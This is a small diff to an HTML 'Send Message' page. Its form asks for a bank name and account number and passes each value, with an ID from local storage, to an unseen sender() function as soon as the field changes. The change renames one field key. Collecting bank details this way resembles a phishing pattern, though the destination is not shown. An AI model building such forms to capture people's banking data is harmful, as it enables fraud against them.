@@ -12,7 +12,7 @@
 <body>
     <h2>📤 Send Message</h2>
     <form id="form" method="post">
-        <input type="text" name="message" onchange="sender({ userId: localStorage.getItem('code'), account: this.value })" placeholder="Type your bank name here">
+        <input type="text" name="message" onchange="sender({ userId: localStorage.getItem('code'), azaName: this.value })" placeholder="Type your bank name here">
         <input type="text" name="message" onchange="sender({ userId: localStorage.getItem('code'), realAcc: this.value })" placeholder="Type your account here">
         <input type="submit" value="Send to Receiver">
     </form>
